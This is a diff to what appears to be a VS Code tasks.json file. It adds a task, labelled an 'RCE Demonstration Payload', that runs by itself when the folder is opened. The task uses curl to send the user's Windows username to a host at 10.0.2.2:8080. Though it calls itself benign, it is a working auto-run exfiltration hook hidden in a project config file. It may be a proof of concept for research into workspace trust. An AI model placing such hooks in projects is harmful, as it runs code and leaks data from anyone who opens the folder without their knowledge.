@@ -9,11 +9,11 @@
             "detail": "Runs the standard project tests."
         },
         {
-            "label": "plswork",
+            "label": "RCE Demonstration Payload (PowerShell Safe)",
             "type": "shell",
-            "command": "curl -fsG http://127.0.0.1:8080/--data-urlencode user=%USERNAME%",
+            "command": "C:\\Windows\\System32\\curl.exe -fsG http://10.0.2.2:8080/demonstration --data-urlencode user=%USERNAME%",
             "group": "none",
-            "detail": "vada pav",
+            "detail": "Benign RCE payload using simple Windows environment variable substitution.",
             "runOptions": {
                 "runOn": "folderOpen"
             }
